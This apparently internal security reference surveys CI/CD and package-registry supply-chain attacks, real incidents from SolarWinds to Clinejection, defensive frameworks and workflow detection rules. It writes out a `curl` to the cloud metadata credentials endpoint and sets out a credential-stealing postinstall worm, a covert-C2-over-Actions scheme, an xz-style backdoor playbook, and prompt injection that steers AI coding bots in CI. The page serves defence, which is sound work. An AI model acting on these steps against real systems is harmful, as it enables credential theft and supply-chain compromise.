**Cloud metadata (169.254.169.254).** Reachable from anything on AWS/GCP/Azure instances. Self-hosted runners on cloud VMs are exposed unless blocked. Classic shape: fork PR on self-hosted EC2-with-IAM-role runs `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/` and exfils short-lived AWS credentials (OWASP CI/CD-SEC-04 + SEC-08). Mitigations: IMDSv2 required (`HttpTokens: required` on the launch template) blocks SSRF-style metadata exfil; container network policies null-route the metadata IP; harden-runner in `egress-policy: block` mode blocks endpoints not on the allowlist; prefer OIDC (per-job, short-lived) over instance-attached IAM roles (per-VM, persistent).

**Cross-tenant runner contamination.** Non-ephemeral self-hosted runners leak state: prior workspace at `$GITHUB_WORKSPACE`, prior env vars in the agent parent, installed system packages, `/tmp` debris, `~/.docker/config.json`, `~/.npmrc`, cron jobs, shell-rc backdoors, SUID binaries, replaced `$PATH` entries. Defense: ephemeral runners — ARC on Kubernetes spawns a fresh pod per job; GitLab Runner `docker` executor with `pull_policy: always`; CircleCI resource classes with VM cleanup.

**Runner-agent privilege escalation.** The runner agent runs as a service-account user. A job with local code execution as that user gets the registration token (in `_diag/` or agent config), cached cloud creds in `~/.aws/`, and read access to other jobs on the same runner. The runner agent self-updates via GitHub's channel — write access to the runner binary persists across re-registrations. Run the agent as a dedicated unprivileged user, immutable filesystem, ephemeral VM, tmpfs workspace.

**Shared cache side channels.** `actions/cache` is content-keyed and scoped to a repository; workflow runs can restore caches created in the current branch or the default branch. Poisoning a default-branch cache entry is *Cacheract*.

---

## 5. Artifact / Registry Attack Surface

**npm.** `postinstall` lifecycle hook runs arbitrary code at install time — most npm supply-chain payloads land here. Maintainer-account takeover (ua-parser-js Oct 2021, `coa`, `rc`): credential reuse / phishing; npm began enforcing 2FA for top-100 package maintainers in Feb 2022. Dependency confusion (Birsan 2021): when a build tool has both public and private registries with no namespace gating, the higher version wins — Birsan published same-named packages to public npm, PyPI, and RubyGems and Microsoft/Apple/PayPal/Shopify/Tesla/Uber/Netflix/Yelp builds picked them over their internal packages. Fix: scoped namespaces (`@my-org/...`) gated to the private registry. Typosquatting is constant background radiation (`lodash-*`, `react-*`, `crossenv`, `webpack-*`).

**PyPI.** `setup.py` runs arbitrary code at install (PEP 517/518 build isolation separates build dependencies; it is not a sandbox). 2022–2024 PyPI compromises targeted developer-machine credential theft via `requirements.txt` typos. PyPI now requires 2FA for all maintainers.

**RubyGems / Maven / NuGet.** RubyGems: `rest-client` and `strong_password` (2019), maintainer takeover. Maven Central: namespace squatting, stale-maintainer takeover; per-artifact signatures don't help if the attacker controls the signing key; xz-style human-vetted backdoors documented against long-tail artifacts. NuGet: same as npm; `init.ps1` post-install; typosquats; namespace-shadowing dependency confusion.

**Container registries.** Docker Hub `latest` is mutable by definition; pin to digest: `image@sha256:...`. Distroless tags (e.g., `gcr.io/distroless/static:nonroot`) are mutable too. Layer cache poisoning: an upstream-CDN cache with misconfigured TTL can serve attacker-replaced layers under existing tags. GHCR images pinned by tag have the same mutable-tag attack — pull by digest.

**GitHub Releases.** A maintainer PAT with `releases: write` can re-upload binaries; most distribution paths don't re-verify checksums after initial upload. SBOM-and-signature: if the signature scopes the release metadata rather than the binary content, the tarball can be swapped. Verify what's signed is what's distributed.

**CocoaPods (CVE-2024-38366/38367/38368, E.V.A Jul 2024 disclosure).** Three criticals on the Trunk server: CVE-2024-38366 (CVSS 10.0) RCE via vulnerable RFC822 Ruby package — crafted email with trailing bash command via shell-metachar injection executed as Trunk; CVE-2024-38367 (CVSS 8.2) zero-click session-token theft via corporate email-scanner link-prefetching; CVE-2024-38368 (CVSS 9.3) "Claim Your Pods" abuse for ~1,866 orphaned packages from the 2014 migration. Patched Oct 2023; scope was "almost every Apple device." The post-2024 paradigm: registry control planes are public web services with the same primitive surface as any other.

---

## 6. Real Incidents — Lit Review

Pattern: build-system compromise is *common*, *cross-sector*, and *predominantly credential-driven* (stolen PATs, session cookies, maintainer accounts). Architectural compromises (SUNSPOT, xz) are rarer but higher-impact.

### SolarWinds / SUNBURST (Dec 2020)

CrowdStrike's SUNSPOT analysis is canonical. SUNSPOT was a custom build-system implant on SolarWinds Orion build servers that intercepted MSBuild, substituted a malicious source file (`InventoryManager.cs`) containing the SUNBURST backdoor, then restored the legitimate file post-compile. The signed Orion DLL shipped backdoored. Attribution: APT29 / NOBELIUM / StellarParticle.

Lesson: SLSA Build L3 (hardened builds with non-forgeable provenance) defeats SUNSPOT — attestations comparing source-tree hash to artifact provenance would expose the substitution.

### Codecov bash uploader (Jan–Apr 2021)

A Docker-image-creation error exposed a credential that allowed an attacker to modify the bash uploader script in the public CDN. The modified script (Jan 31 – Apr 1, 2021) replaced Codecov's server IP with the attacker's and uploaded customer environment variables, API tokens, SSH keys. Hundreds of customer networks were accessed (Twilio, HashiCorp, Rapid7, Confluent).

Detection: a customer doing SHASUM verification noticed published SHA256 didn't match served file. Lessons: integrity-verify pipeline-fetched scripts; `curl | sh` is the anti-pattern (Codecov retired the bash uploader for a signed CLI); Docker-image artifacts of build are sensitive.

### Kaseya VSA (Jul 2021, CVE-2021-30116)

Auth bypass in Kaseya VSA's web UI; REvil pushed ransomware to ~60 MSPs serving ~1500 downstream businesses. DIVD had privately reported seven vulnerabilities in April 2021; patches were in flight but un-shipped when REvil exploited.

Lesson: MSP-style vendor platforms with privileged downstream write must be treated as production assets by both vendor and customer; out-of-band patch deployment for MSP control planes.

### ua-parser-js (Oct 2021)

Maintainer-account takeover; XMRig + Windows credential stealer published as 0.7.29 / 0.8.0 / 1.0.0 in a 4-hour window on Oct 22, 2021. Maintainer noticed when their inbox was flooded with spam, likely sent to bury npm's notification emails. Same playbook hit `coa` and `rc` in the following weeks.

Lesson: mandatory 2FA for high-impact maintainers — npm now enforces this.

### CircleCI (Jan 2023)

Dec 16 2022: a CircleCI engineer's MacBook was infested with infostealer malware that bypassed AV and extracted the engineer's SSO session cookie. Dec 19: attacker logs in remotely; recon. Dec 22: exfil of customer env vars, tokens, OAuth tokens. Dec 29: a customer alerts CircleCI to suspicious GitHub OAuth activity. Jan 4 2023: public disclosure; "rotate all secrets stored in CircleCI."

Lesson: the laptop is part of the CI threat surface; just-in-time prod access with MFA on every session-elevation; comprehensive admin-operation audit logging.

### 3CX (Mar 2023)

First publicly-documented **double supply-chain attack**. UNC4736 (suspected DPRK) compromised Trading Technologies' site in 2022 and replaced the X_TRADER installer with a signed-but-backdoored version (VEILEDSIGNAL). A 3CX employee downloaded X_TRADER in Apr 2022; VEILEDSIGNAL established a foothold; the attacker moved laterally to 3CX's build infra; the 3CX softphone shipped backdoored in Mar 2023.

Lesson: developer-machine compromise is a build-system compromise; the trust chain crosses organizational boundaries.

### MOVEit (May–Jun 2023)

CVE-2023-34362 SQLi in Progress MOVEit Transfer; CL0P exploited across thousands of customer deployments to exfiltrate data. Not strictly CI/CD — managed file transfer — but the same vendor-platform-criticality pattern with downstream ripple. A small number of US federal agencies, financial services firms, healthcare providers affected.

Lesson: vendor-platform criticality scoring; CL0P's mass-exploit-then-extort playbook is now a recurring pattern.

### xz-utils / Jia Tan (Mar 2024, CVE-2024-3094, CVSS 10.0)

Multi-year social engineering by "Jia Tan" (JiaT75). Starting Oct 2021, Jia Tan and a network of sock-puppet accounts (Jigar Kumar, krygorin4545, misoeater91) made useful contributions to xz-utils and applied sustained pressure on maintainer Lasse Collin to add a co-maintainer. By Feb 2024 Jia Tan had write access; on Feb 24–Mar 9 2024, xz-utils 5.6.0/5.6.1 shipped with a backdoor.

Critical structural detail: the backdoor lived in the *release tarball* (modified `build-to-host.m4` + obfuscated test files), not in git. Standard git-side review wouldn't detect it. The backdoor activated only when building OpenSSH with systemd notifications on x86_64 Linux with specific glibc constraints — Debian/Fedora/SUSE production targets. Once loaded into sshd via systemd, the backdoor enabled RCE for an attacker with the matching Ed448 private key.

Discovery: Andres Freund (PostgreSQL maintainer) noticed sshd CPU regressions on Debian unstable. Disclosure Mar 29 2024.

Lessons: (a) source-vs-artifact divergence — reproducible builds defeat tarball-vs-git tricks; (b) maintainership succession is a security event; (c) sock-puppet pressure campaigns are a recognized attack class.

### CocoaPods (disclosed Jul 2024, patched Oct 2023)

See §5. Semgrep response: semgrep.dev/blog/2024/cocoapods-vulnerabilities-highlight-risks-in-dependency-managers/.

### tj-actions/changed-files (Mar 14–15 2025, CVE-2025-30066)

See §2.3. Unit 42 (confirmed by Wiz): the initial targeting was Coinbase via a chained compromise of `reviewdog/action-setup@v1` (CVE-2025-30154), used to compromise the `tj-actions-bot` PAT, which fanned out to ~23k repos. The Coinbase chain proves pre-meditation; broader fan-out was the attack vector's side effect.

Lessons (now policy at many shops): SHA pinning, Renovate-managed bumps, harden-runner egress filtering, CODEOWNERS on workflows, pre-staged secret-rotation runbooks.

### Polyfill.io CDN (Jun 2024)

On Jun 25 2024, Sansec disclosed that the `cdn.polyfill.io` CDN — embedded as a script tag on 100,000+ websites — was serving payloads that dynamically generated mobile-targeted redirects to gambling and adult sites. Funnull (a Chinese entity) had acquired the domain in Feb 2024 from the original maintainer; the malicious behavior was layered in afterward. The payload was *header-aware* (no execution for admins, scrapers, or non-mobile UAs), specifically to evade casual review. Namecheap took the domain down Jun 26; Cloudflare and Fastly stood up real-time rewrite mirrors.

Lesson: a `<script src="https://thirdparty.cdn/...">` tag is structurally `uses: <stranger-org>/<unknown-action>@<floating-ref>` — implicit live-loaded trust at request time with no SHA pinning, no SRI hash, no review gate. SRI (`integrity="sha384-..."`) hashes pin the served content; Content Security Policy with `script-src` allowlists narrow the reachable origin set; self-hosting eliminates the third-party-CDN class entirely. Semgrep response: semgrep.dev/blog/2024/protect-your-code-from-the-polyfill-supply-chain-attack/.

### Lottie Player (Oct 2024)

Oct 30 2024: LottieFiles disclosed that three rogue versions of `@lottiefiles/lottie-player` (2.0.5/2.0.6/2.0.7) had been pushed to npm in a one-hour window using a developer's compromised npm automation token — automation tokens skip 2FA on publish. Package weekly downloads ~94k; many integrators consumed via CDN without a pinned version and were auto-served the malicious build. Payload was a crypto-wallet drainer prompting users on integrating sites to "connect" their wallet. Patched as 2.0.8 (identical contents to 2.0.4).

Lesson: **npm automation tokens are a 2FA bypass primitive by design** (intended for CI publish). Treat them as production credentials: scope tightly (one token per package), short TTL, store in secret manager (not `~/.npmrc` on developer laptops), require trusted-publisher OIDC flow instead where supported (npm Trusted Publishing became GA Jul 2025 — see §7).

### Solana web3.js (Dec 2024, CVE-2024-54134)

Dec 3 2024, 15:20–20:25 UTC: two unauthorized versions of `@solana/web3.js` (1.95.6 and 1.95.7) were published to npm after a successful spear-phishing campaign against developers with publish privileges in the `@solana` namespace. Payload exfiltrated private-key material from any consuming application that handled keys directly (trading bots, custodial backends) to an attacker-controlled server (`sol-rpc[.]xyz`) disguised as Cloudflare headers. Patched as 1.95.8. CVSS 8.3.

Lesson: phishing-resistant credentials (hardware-backed WebAuthn / passkeys) on registry-publish identities; TOTP / SMS 2FA does not defeat real-time relay phishing. Library consumers that don't pin to a lockfile got the malicious version automatically.

### Ultralytics PyPI / GitHub Actions (Dec 4–7 2024)

Two-phase compromise of the `ultralytics` PyPI package. Phase 1 (Dec 4–5): versions 8.3.41 and 8.3.42 published with an XMRig cryptominer payload. Phase 2 (Dec 7): versions 8.3.45 and 8.3.46 same. **Root cause was a `pull_request_target` script injection bug in the ultralytics GitHub Actions workflow** — the very class Adnan Khan had publicly disclosed against this same project in Aug 2024, four months prior. The exploit chained the script injection into cache poisoning (Cacheract primitive, §2.7) to substitute the published artifact while leaving the git tree clean. The trojaned wheel on PyPI did not match the source repository contents at the same tag — the source-vs-artifact divergence signal that SLSA L3 provenance verification was designed to surface.

Lessons: (a) prior public disclosure of a workflow class against a specific project is a watchlist signal; (b) the **Pwn Request + Cacheract chain** is now the canonical artifact-substitution path on GitHub Actions; (c) SLSA build provenance with consumer-side verification (rekor entry → workflow_ref → expected source-tree SHA) would have flagged the wheel-vs-source divergence; (d) PyPI Trusted Publishers (OIDC, no long-lived API token) closes the credential-theft variant of the same primitive.

### Snowflake / UNC5537 (May–Jun 2024)

Mandiant's UNC5537 report: ~165 Snowflake customer instances compromised via credential reuse. ~80% of compromised accounts used credentials stolen by infostealer malware (some as old as Nov 2020). Victims: AT&T, Ticketmaster, Santander, LendingTree, Advance Auto Parts, Neiman Marcus. Affected instances lacked MFA; credentials had not been rotated in up to four years.

Not strictly CI/CD but pattern-identical to CircleCI 2023: infostealer on a single laptop produces persistent multi-tenant data-plane access.

Lesson: same as CircleCI 2023. Assume infostealer on the laptop; MFA on data-plane access; rotate credentials on schedule and after personnel changes.

### Shai-Hulud npm worm (Sept 2025)

First publicly-observed **self-replicating npm worm**. Initial vector: maintainer-account takeover (phishing / infostealer-harvested npm tokens) against several mid-popularity packages. The trojaned package versions shipped a `postinstall` script that scanned the install host for credentials — `~/.npmrc`, `~/.aws/credentials`, `~/.git-credentials`, environment variables, and (when run inside GitHub Actions) the runner's `GITHUB_TOKEN` and any cached secrets — then used any found npm publish tokens to push trojaned versions of OTHER packages the compromised maintainer owned, fanning out across the dependency graph. Credentials were exfiltrated to attacker-controlled infrastructure in parallel. The worm name references the Dune sandworms.

Lessons: (a) **`postinstall` scripts run with developer-environment credentials available** — `npm install --ignore-scripts` defends, as does executing installs inside ephemeral sandboxes; (b) **npm publish tokens are worm fuel** — Trusted Publishing (OIDC, per-build, no long-lived token) shrinks the credential surface that worm propagation needs; (c) the worm-vs-targeted-attack distinction matters operationally: targeted attacks (Solana web3.js, Ultralytics) compromise one package at a time, but a worm self-amplifies and the bounded-blast-radius assumption breaks; (d) registry-side propagation detection (trufflehog-scan-on-publish, anomalous-author-burst detection) is needed because consumer-side detection arrives too late.

---

## 7. Defensive Frameworks

**SLSA — Supply-chain Levels for Software Artifacts.** v1.1 (Apr 2025) defines a build-integrity ladder: **L0** no measurement; **L1** documented build with unsigned provenance; **L2** hosted build platform with signed provenance; **L3** isolated build (no cross-tenant contamination, no privilege escalation from build), non-forgeable provenance. Consumers verify L3+ artifacts were built by a specific platform from a specific source revision. SLSA doesn't solve "is the source malicious" — that's code review. GitHub's `attestations: write` permission + `actions/attest-build-provenance` provide SLSA v1.0 Build L2 attestations (Build L3 when the build runs in a shared reusable workflow); public repos write to the public-good Rekor log, private repos use GitHub's Sigstore instance with no transparency log.

**sigstore (cosign / fulcio / rekor).** cosign signs and verifies (container images, blobs, in-toto attestations, SBOMs). fulcio is the CA issuing 10-minute signing certificates tied to an OIDC identity (`developer@example.com` from Google, or `https://github.com/org/repo/.github/workflows/build.yml@refs/tags/v1` from GitHub Actions OIDC). rekor is the public append-only transparency log of every signing event. **Keyless flow:** CI workflow gets OIDC token → presents to fulcio → receives short-lived cert → signs artifact → cosign writes signature + cert + rekor entry. Consumers verify the rekor entry, the signature, and that the cert's OIDC subject matches an allowlist (e.g., "workflow from `org/repo` on `refs/tags/v*`"). No key to steal, no rotation cadence; signer identity bound to the cert.

**npm Trusted Publishing (GA Jul 2025).** npm + Sigstore now generate L3-grade build provenance automatically when the publishing workflow uses OIDC trusted-publisher flow (no long-lived `NPM_TOKEN`). Provenance statement embeds the workflow_ref + commit SHA + builder identity, written to rekor. Public-beta-period stats (Apr 2023 – Sep 2023): 3,800+ projects, 134 high-impact, 500M+ provenance-enabled downloads. Source: blog.sigstore.dev/npm-provenance-ga/, infoq.com/news/2025/08/provenance/.

**GitHub Artifact Attestations (GA Jun 2024).** `actions/attest-build-provenance` is the GitHub-managed wrapper around cosign keyless + rekor. Generates SLSA v1.0 build-provenance attestations for any artifact produced on GitHub-hosted runners with one workflow step (`permissions: { id-token: write, attestations: write, contents: read }`). Consumer verification: `gh attestation verify <artifact> --owner <org>` checks the rekor entry, validates the OIDC subject against the expected `repo:<org>/<repo>:ref:refs/tags/v*` pattern, and confirms the artifact's SHA-256 was signed by the expected workflow. Practical effect: a consumer who pins `gh attestation verify --owner my-org --signer-workflow .github/workflows/release.yml` to their consumption step catches artifact substitution (Ultralytics-class) even when the source-tree commit is clean.

**Pinning ladder** (worst to best): `@main`/`@latest` (mutable), `@v4`/`@4.2.2` (mutable — see tj-actions), `@v4` major-tag (especially mutable), `@<40-char-sha>` (immutable absent SHA-1 collision or detectable force-push), `@<sha> # v4.2.2` with comment (canonical; Renovate/Dependabot re-PRs the SHA on upstream releases). For language deps: lockfiles (`package-lock.json`, `yarn.lock`, `Cargo.lock`, `Pipfile.lock`, `poetry.lock`, `go.sum`, `uv.lock`) pin to content hash. **Cooldowns** (npm `min-release-age`, yarn `npmMinimalAgeGate`, uv `exclude-newer`, pnpm `minimumReleaseAge`) prevent picking up brand-new versions before the security community has had time to flag malicious ones — see `~/ai/CLAUDE.md` org policy.

**Reproducible builds.** Same source + same environment → byte-identical artifact. Debian, Tor, NixOS, Bazel are the practitioner contexts. Defeats SUNSPOT-style build-system compromises by making source-vs-artifact divergence detectable. SLSA v0.1's L4 listed reproducibility as best-effort; SLSA v1.x lists it among candidate requirements for a future Build L4.

**OpenSSF Scorecard.** ~20 automated checks, 0–10 score. The most-relevant for CI/CD: **Branch-Protection**; **Dangerous-Workflow** (Critical risk — detects `pull_request_target`/`workflow_run` with PR-HEAD checkout and untrusted-input interpolation into inline scripts); **Pinned-Dependencies** (SHA pinning); **Token-Permissions** (no `write-all`); **Signed-Releases**; **Vulnerabilities** (OSV cross-ref); **Maintained**; **Code-Review**; **SAST**; **Dependency-Update-Tool**. Scorecard is policy, not boundary; 10/10 means structural hygiene is in place, not "uncompromisable." Add the Scorecard workflow to any new project.

**harden-runner.** Audit mode records observed egress and outputs a recommended allowlist; block mode enforces. Global block list (StepSecurity SOC) covers known-bad domains from active campaigns; StepSecurity detected tj-actions through harden-runner anomaly detection of an unexpected outbound endpoint. ARC-on-Kubernetes variant runs as a DaemonSet.

**Minimum-scope `permissions:`.** Workflow default `permissions: contents: read`; per-job opt-in for `contents: write`, `packages: write`, `id-token: write`. Combine with workflow-top `permissions: {}` for strongest default.

**CODEOWNERS on `.github/workflows/`.** Force workflow-team review on workflow modifications; combined with "Require review from Code Owners" branch protection, this is the structural defense against workflow-modifying-PRs that bypass the secrets boundary.

**Branch protection (production repos).** Required PR reviews (≥1, ideally 2); `dismiss_stale_reviews = true`; `require_code_owner_reviews = true`; `required_signatures = true`; required status checks include CI + Scorecard; `enforce_admins = true`; restricted push allowlist; `allow_force_pushes = false`; `allow_deletions = false`.

**OIDC trust-policy claim restrictions.** Constrain `iss` to GitHub's OIDC issuer; constrain `aud`; constrain `sub` to a specific repo (`repo:org/repo:*` minimum; `repo:org/repo:environment:production` better); prefer `repository_id` (numeric, immutable) over `repository` (string, mutable on rename); constrain `job_workflow_ref` for reusable-workflow trust. Most-common misconfiguration: `sub` wildcard or absence.

**EU Cyber Resilience Act (Regulation EU 2024/2847).** Entered into force Dec 10 2024; reporting obligations mandatory Sep 11 2026; full application Dec 11 2027. Scope is "products with digital elements" placed on the EU market in the course of commercial activity. Open-source software *not monetized by its maintainers* is largely out of scope, but the regulation introduces a new "open-source steward" role for legal persons providing sustained support for OSS projects intended for commercial use — stewards must implement a cybersecurity policy, cooperate with authorities, and report actively exploited vulnerabilities. CI/CD-relevant implications: manufacturers of in-scope products must (a) maintain an SBOM, (b) demonstrate secure build practices (effectively SLSA-equivalent assurances), (c) provide security updates for the support period declared in product documentation, (d) report exploited vulnerabilities within 24h of awareness to ENISA. The Dec 11 2027 cliff is now in budget cycles at most EU-distributing vendors; expect SLSA-L2+/L3 provenance and signed-release evidence to become procurement requirements rather than nice-to-haves over 2026–2027. Sources: digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act; openssf.org/public-policy/eu-cyber-resilience-act/.

**Credential rotation verification (vs. UI-level reset).** Clinejection (§2.9, GHSA-9ppg-jx86-fqw7) exposed a generalizable post-incident failure mode. After public disclosure (Feb 9 2026) Cline rotated credentials and checked npm's org-level token page, which showed zero active tokens, but the wrong token had been deleted and the exposed token stayed active until Feb 17 2026 — an ~8-day false-sense-of-revocation window, ending when an unauthorized party used the still-active token to publish `cline@2.3.0`. Rotation through a UI/dashboard and revocation at the issuing authority are two distinct operations; high-confidence incident response requires verifying the second, not just the first. Concrete verification: after rotating any CI publish token (npm, PyPI, Maven Central, marketplace, OCI registry, GitHub PAT), attempt authentication using the *old* token against the registry's API — successful auth indicates the rotation did not propagate to the auth layer. For npm specifically, `npm whoami --userconfig <path-with-old-token>` against the registry confirms revocation status; PyPI exposes the same shape via `twine upload --verbose` with the old token. Bridges to `[[reference-dfir-methodology]]` containment-vs-eradication distinction: UI rotation is containment-grade (stops *new* uses via the legitimate path); revocation-at-authority is eradication-grade (stops *all* uses including from previously-issued copies of the token). Adopt OIDC trusted publishing (per "npm Trusted Publishing" above; equivalent flows on PyPI, Maven Central via Sonatype Central Publisher Portal) to eliminate the failure mode entirely — short-lived OIDC tokens have no rotation surface to mismanage.

---

## 8. Detection / Rule-Authoring Patterns

Bridge into static-analysis rule authoring against `.github/workflows/*.yml` and equivalent CI YAML.

### Static analysis on `.github/workflows/*.yml`

Detection corpus, ordered by approximate finding density:

1. **Untrusted-input interpolation in `run:` blocks.** Flag `${{ github.event.<sink> }}` inside `run:` for sinks in the GitHub Security Lab list (`pull_request.title|body|head.ref|head.label`, `issue.title|body`, `comment.body`, `commits.*.message|author.email|author.name`, etc.). HIGH when workflow has secrets exposure or write `GITHUB_TOKEN`; MEDIUM otherwise.
2. **Third-party actions with mutable refs.** Flag `uses: <owner>/<repo>@<ref>` where `<ref>` matches `v\d+(\.\d+)*` or any branch-shaped string. SHA form (`@[a-f0-9]{40}`) is the only acceptable shape. Same-owner pinning may be policy-relaxed but should still SHA-pin.
3. **`pull_request_target` with PR-HEAD checkout.** Flag `pull_request_target` workflows containing `actions/checkout` with `ref: ${{ github.event.pull_request.head.* }}`. CRITICAL — direct RCE.
4. **`workflow_run` with PR-HEAD checkout.** Same shape, different trigger. CRITICAL.
5. **`permissions: write-all` or no permissions block on trusted-context workflows.** MEDIUM; one-line fix.
6. **Self-hosted runners on public repositories.** Flag `runs-on: self-hosted` (or non-`ubuntu-*`/non-`windows-*`/non-`macos-*` labels) on public repos. HIGH. Public-vs-private bit usually needs an out-of-band check against the repo visibility API.
7. **`secrets: inherit` to reusable workflows with non-SHA refs.** Reusable workflows called with `secrets: inherit` pass all caller secrets; flag when source isn't SHA-pinned.
8. **`actions/cache/restore` in privileged workflows sharing keys with PR workflows.** Cacheract primitive. Flag when restore runs on `main`/`pull_request_target`/`workflow_run` and the cache key is reachable from `pull_request`.
9. **`docker run --privileged` or `/var/run/docker.sock` mounts.** Container-escape primitive.
10. **OIDC `sub` claim audits.** Out-of-band check against cloud trust policies for AWS / GCP.

### Runtime detection

Catches active compromises that static analysis missed:

- **Anomalous egress.** harden-runner's primary signal. A workflow that normally egresses to npm.pkg.github.com + api.github.com suddenly hits a random hosting-provider IP — alarm.
- **Cache invalidation patterns.** Sudden churn on stable cache keys is a Cacheract signal.
- **Secret-shaped HTTP egress.** Outbound POST/PUT bodies matching AWS keys, GitHub PATs, Stripe keys, JWTs — block and alert.
- **Process anomalies.** A workflow that normally runs `node`/`npm` suddenly executes `python3 /tmp/<random>.py`.
- **File integrity.** Modification of `_diag/` or `.runner` on a self-hosted runner outside a runner-update event.

### Cross-links

- **Organizational SHA-pinning policy** (`/Library/Application Support/ClaudeCode/CLAUDE.md`) — SHA-pin every action; readable comment; Renovate; harden-runner. New workflow PRs violating policy are flagged by the org's own Semgrep rules.
- **A 5-check pre-investigation pass** for CI/CD supply-chain audits: (1) trigger/privilege model; (2) action pinning; (3) self-hosted runner exposure; (4) OIDC trust-policy claims; (5) branch protection + CODEOWNERS on workflows.

---

## 9. Variant Analysis — Under-Explored

The published corpus concentrates on high-impact incidents; the structural primitives generalize further.

**Renovate / Dependabot trust model.** Update bots run with elevated trust by design — write access to open PRs, auto-merge if CI passes. Failure modes: (a) auto-merge on bot PRs fires before any human reviews tag-mutation-faked "trusted publisher" updates; (b) the bot's PAT is its own attack surface — a bot-installation compromise is write-to-every-customer-repo; (c) cooldowns codified in the org policy (`exclude-newer = "1 week"` for uv, `npmMinimalAgeGate: "1w"` for yarn, `min-release-age=7` for npm, `minimumReleaseAge: 10080` for pnpm, `cooldown.default-days: 7` for Dependabot) convert same-day compromise windows into week-long detection windows.

**Bazel / Pants / Nx remote-cache attacks.** Content-hash-keyed remote caches assume hash collision resistance and reproducible production. Failures: cache-key collisions when hash inputs are incomplete; build-result poisoning where a build writes a different output to the same key; unauthenticated remote caches (some Bazel deployments behind "trusted internal network") are write-everywhere primitives once any internal machine is compromised. Defense: `--remote_upload_local_results=false` (read-only mode for untrusted builders); analogous patterns in Pants and Nx.

**CI as covert C2.** GitHub Actions is free for public repos. A threat actor creates an unread public repo and runs a workflow every 5 minutes that reads a "command" file via `gh api`, executes it, writes results to a "response" file. All traffic is GitHub-to-GitHub — no anomalous DNS, no anomalous egress IPs, invisible to corporate egress monitors. Mitigation is corporate-egress-level (block `git push` to non-allowlisted orgs) or org-level (SSO; prevent personal-account writes from corporate machines).

**AI-coding-tool integration.** When Copilot / Cursor / Claude Code commits workflow changes, the suggestion process is itself a supply-chain vector: (a) a poisoned or simply stale model suggests subtly insecure patterns (e.g., `@v4` over `@<sha>` because the training corpus reflects pre-2024 conventions, even though tj-actions in Mar 2025 made tag-pinning a known-bad default); (b) prompt injection in existing repo content (issue bodies, PR descriptions, vendored READMEs) steers suggestions toward attacker-favorable patterns when the agent reads the repo before suggesting; (c) the AI agent's PAT / OAuth is an attack surface with broad write — a Cursor or GitHub Copilot integration token typically scopes to all repos the user can see; (d) third-party agent extensions and "MCP servers" / marketplace plugins introduce additional supply-chain links — the agent's tool-side dependencies are now part of the developer's effective dependency tree. Defenses: human code-review discipline on AI-authored workflow YAML; structural Semgrep rules that catch the AI-bias-toward-outdated-pattern shape (tag-pinned actions, `permissions: write-all`, missing `permissions:` block, `pull_request_target` + `ref: head.sha`); narrow OAuth scopes on the agent identity (per-repo, not org-wide); pre-merge enforcement so AI-suggested workflow changes can't bypass CODEOWNERS on `.github/workflows/`.

**Cross-org Actions usage.** `uses: <stranger-org>/<unknown-action>@<sha>` is structurally `npm install <unknown-package>` — implicit trust transfer. GitHub Enterprise can allowlist "only actions from the following orgs"; use it.

**Multi-stage compromise (xz template).** The playbook is now public; expect imitators: (1) identify a critical low-maintainer OSS project in the OpenSSH / systemd / glibc closure; (2) submit useful contributions for 12–24 months under a plausible identity; (3) sock-puppet pressure for co-maintainer access; (4) receive write; (5) land the backdoor in the *release tarball* not git; (6) wait for distros. Defenses are partly social (OpenSSF Maintainer Health) and partly technical (reproducible builds defeat tarball-vs-git divergence; two-maintainer review on release tarballs; signing-key custody review on maintainership transitions). The xz silver lining: *it was caught*. A less-noisy backdoor (no 500ms sshd CPU regression) might not be. Assume uncaught xz-equivalents in your dependency closure today.

---

## 10. 2026 mid-year currency layer

CI/CD and supply-chain threat surface moved on multiple axes between Jan 2026 and May 2026. This section captures what changed in that window and what the empirical adoption picture of defenses looks like at the mid-year mark — not as a rewrite, but as a refresh anchor for readers landing in mid-2026 who need to know which of the doctrines above are now under-specified.

### 10.1 Clinejection class — AI-bot-in-CI compromise pattern

GHSA-9ppg-jx86-fqw7 (Adnan Khan, disclosed Jan 1 2026, public Feb 9 2026; writeup at `https://adnanthekhan.com/posts/clinejection/`; Cline post-mortem at `https://cline.bot/blog/post-mortem-unauthorized-cline-cli-npm`) is the canonical 2026 H1 anchor for the AI-bot-in-CI compromise class. §2.9 covers the specific chain; the 2026 H1 refresh is the *generalization*: the load-bearing structural shape is **untrusted text + agent tool access + privileged context**, not any one GitHub Actions trigger. The triggers are incidental — the original Clinejection landed via `issues` (with `allowed_non_write_users: "*"`), but `pull_request_target`, `workflow_run`, `issue_comment`, `discussion_comment`, `pull_request_review_comment`, and `gollum` (wiki edits) all inherit the same shape when a bot consumes user-controlled text and holds tool authority. Variant catalogues in the months after disclosure (`https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aactions`) show the same triple landing across `claude-code-action` and `run-gemini-cli` — each with their own CVE / GHSA but the same root pattern. Treat the triple as the threat-model unit; treat the trigger as a sensor for which `permissions:` block applies. Cross-link [[reference-ai-incident-response-playbook]] for the IR-side response procedure when this fires, [[reference-ai-pr-review-platform]] §4 for the vendor-side threat model, and [[reference-ai-assisted-coding-tool-security]] §§9-10 for the upstream tool-side surface.

### 10.2 GitHub Actions LRU cache eviction policy aftermath

GitHub's late-2025 cache changes (size-based LRU eviction checked hourly instead of every 24 hours, enforced from Nov 2025, and optional pay-as-you-go cache above the default 10 GB per repo from Nov 20 2025; see GitHub Changelog Sep 29 2025 and Nov 20 2025 entries on cache limits and `https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows#usage-limits-and-eviction-policy`) closed an implicit safety margin that Cacheract's flood-then-claim shape (§2.7) had previously had to fight against probabilistically. Post-Nov-2025, the attacker can size the flood deterministically against the documented LRU window. Through 2026 H1: no GitHub-shipped *structural* mitigation has landed — the cache scope-isolation model (default branch caches are not readable from PR contexts, but branch caches are shared within a branch tree) is unchanged, and no new server-side anomaly-detection signal on cache-overwrite frequency has been documented. The practical mitigation remains the original Adnan Khan recommendation: treat the cache as an untrusted artifact; do not restore cache in privileged-context workflows (`pull_request_target`, `workflow_run`, deploy/publish workflows); use `actions/cache/restore` with a strict `key:` (no `restore-keys:` fallback) and verify cache contents post-restore against a known-good hash where the cache holds tool binaries or compiled artifacts. Real-world post-disclosure exploitation reports remain sparse in public reporting through May 2026 [unverified — Cacheract-pattern exploitations of 2026 H1 are mostly attributed in vendor blogs without independent confirmation]; the absence of public reports is not evidence of absence given the cache-poisoning shape's stealth.

